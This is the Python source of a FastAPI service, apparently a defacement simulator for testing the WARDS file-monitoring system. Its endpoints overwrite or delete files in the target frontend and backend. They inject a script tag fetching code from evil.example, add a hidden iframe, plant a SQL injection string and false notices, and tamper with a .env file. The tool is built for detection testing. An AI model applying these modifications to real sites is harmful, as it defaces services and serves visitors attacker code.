from __future__ import annotations

import os
import shutil
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

BASE_DIR = Path(__file__).resolve().parent
MASTER_ROOT = Path(os.getenv("WARDS_MASTER_ROOT", BASE_DIR.parent)).resolve()
WARDS_ROOT = Path(os.getenv("WARDS_TARGET_ROOT", MASTER_ROOT / "WARDS")).resolve()
ATTACK_BACKUP_ROOT = BASE_DIR / "attack_backups"

app = FastAPI(title="Third-Party WARDS Defacement Simulator", version="1.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)


class AttackResult(BaseModel):
    attack: str
    target: str
    status: str
    detail: str
    timestamp: str


def target_path(relative: str) -> Path:
    resolved = (WARDS_ROOT / relative).resolve()
    try:
        resolved.relative_to(WARDS_ROOT)
    except ValueError:
        raise HTTPException(status_code=400, detail="Target escaped WARDS root.")
    return resolved


def backup_target(path: Path) -> None:
    if not path.exists():
        return
    relative = path.relative_to(WARDS_ROOT)
    backup = ATTACK_BACKUP_ROOT / datetime.utcnow().strftime("%Y%m%d_%H%M%S") / relative
    backup.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(path, backup)


def read(path: Path) -> str:
    if not path.exists():
        raise HTTPException(status_code=404, detail=f"Target missing: {path}")
    return path.read_text(encoding="utf-8", errors="ignore")


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    backup_target(path)
    path.write_text(content, encoding="utf-8")


def result(name: str, path: Path, detail: str) -> AttackResult:
    return AttackResult(
        attack=name,
        target=str(path),
        status="executed",
        detail=detail,
        timestamp=datetime.utcnow().isoformat(),
    )


@app.get("/api/status")
def status():
    return {
        "status": "ready",
        "wards_root": str(WARDS_ROOT),
        "isolated": True,
        "note": "This service imports no WARDS modules. It only modifies files as an external attacker simulator.",
    }


@app.post("/api/attacks/visual-defacement", response_model=AttackResult)
def visual_defacement():
    path = target_path("frontend/src/pages/public/Home.jsx")
    original = read(path)
    payload = """<>
      <div style={{position:'fixed', inset:0, zIndex:2147483647, background:'linear-gradient(180deg, #7f1d1d 0%, #450a0a 100%)', color:'#fff', display:'flex', alignItems:'center', justifyContent:'center', textAlign:'center', padding:'40px', pointerEvents:'none'}}>
        <div>
          <p style={{fontSize:'14px', letterSpacing:'0.24em', fontWeight:900, color:'#fca5a5'}}>WARDS_DEFACEMENT_TEST</p>
          <h1 style={{fontSize:'72px', margin:'16px 0', fontWeight:900, textShadow:'0 4px 24px rgba(0,0,0,0.6)'}}>SYSTEM COMPROMISED</h1>
          <p style={{fontSize:'26px', color:'#fecaca'}}>Public tax services have been replaced by an unauthorized page.</p>
          <p style={{marginTop:'24px', fontSize:'18px', color:'#fca5a5'}}>Restore operations from the Security Dashboard immediately.</p>
        </div>
      </div>
"""
    if "return (\n    <>" in original:
        modified = original.replace("return (\n    <>", "return (\n    " + payload, 1)
    else:
        modified = original + "\n/* WARDS_DEFACEMENT_TEST: SYSTEM COMPROMISED */\n"
    write(path, modified)
    return result("visual_defacement", path, "Added a visible defacement marker to the public home page source.")


@app.post("/api/attacks/css-defacement", response_model=AttackResult)
def css_defacement():
    path = target_path("frontend/src/index.css")
    original = read(path)
    payload = """

/* WARDS_DEFACEMENT_TEST_CSS */
body::before {
  content: "WARDS SECURITY ALERT: THIS PAGE HAS BEEN DEFACED - UNAUTHORIZED CONTROL MESSAGE";
  position: fixed;
  z-index: 2147483647;
  top: 0;
  left: 0;
  right: 0;
  padding: 18px;
  background: #b91c1c;
  color: white;
  text-align: center;
  font: 800 20px Arial, sans-serif;
}
body::after {
  content: "SYSTEM COMPROMISED";
  position: fixed;
  z-index: 2147483646;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(0, 0, 0, 0.72);
  color: #ef4444;
  font: 900 64px Arial, sans-serif;
  letter-spacing: 0.08em;
  pointer-events: none;
  animation: wardsDefacePulse 2s infinite;
}
@keyframes wardsDefacePulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.6; }
}
"""
    write(path, original + payload)
    return result("css_defacement", path, "Appended a CSS overlay that visibly marks WARDS as hacked.")


@app.post("/api/attacks/script-injection", response_model=AttackResult)
def script_injection():
    path = target_path("frontend/index.html")
    original = read(path)
    payload = '<script src="http://evil.example/wards-malware.js"></script>'
    if "</body>" in original:
        modified = original.replace("</body>", f"  {payload}\n</body>")
    else:
        modified = original + "\n" + payload
    write(path, modified)
    return result("script_injection", path, "Injected an external script reference into WARDS index.html.")


@app.post("/api/attacks/iframe-injection", response_model=AttackResult)
def iframe_injection():
    path = target_path("frontend/src/App.jsx")
    original = read(path)
    payload = '\n{/* <iframe src="http://evil.example/hidden" style={{display:"none"}} /> */}\n'
    write(path, original + payload)
    return result("iframe_injection", path, "Injected an iframe pattern marker into the app source.")


@app.post("/api/attacks/content-manipulation", response_model=AttackResult)
def content_manipulation():
    path = target_path("frontend/src/pages/public/Contact.jsx")
    original = read(path)
    payload = "\n\n{/* FALSE NOTICE: All treasury services are suspended by an attacker. */}\n"
    write(path, original + payload)
    return result("content_manipulation", path, "Added false public information to a public-facing page.")


@app.post("/api/attacks/sql-pattern", response_model=AttackResult)
def sql_pattern():
    path = target_path("frontend/src/pages/auth/UnifiedLogin.jsx")
    original = read(path)
    payload = "\n// WARDS_DEFACEMENT_SQL_PATTERN: ' OR '1'='1 --\n"
    write(path, original + payload)
    return result("sql_pattern", path, "Injected a classic SQL injection pattern into login source.")


@app.post("/api/attacks/file-delete", response_model=AttackResult)
def file_delete():
    path = target_path("frontend/src/pages/public/TaxpayerGuide.jsx")
    if not path.exists():
        raise HTTPException(status_code=404, detail="Target file already missing.")
    backup_target(path)
    path.unlink()
    return result("file_delete", path, "Deleted a monitored public page file. Security should classify this as deletion.")


@app.post("/api/attacks/mass-defacement")
def mass_defacement():
    results = [
        visual_defacement(),
        css_defacement(),
        content_manipulation(),
    ]
    return {"attack": "mass_defacement", "status": "executed", "results": [item.model_dump() for item in results]}


@app.post("/api/attacks/config-tamper", response_model=AttackResult)
def config_tamper():
    path = target_path("backend/.env")
    original = read(path)
    payload = "\n# WARDS_DEFACEMENT_CONFIG_TAMPER=secret=attacker-token\n"
    write(path, original + payload)
    return result("config_tamper", path, "Appended credential-like content to backend environment configuration.")


app.mount("/", StaticFiles(directory=str(BASE_DIR), html=True), name="defacement-ui")
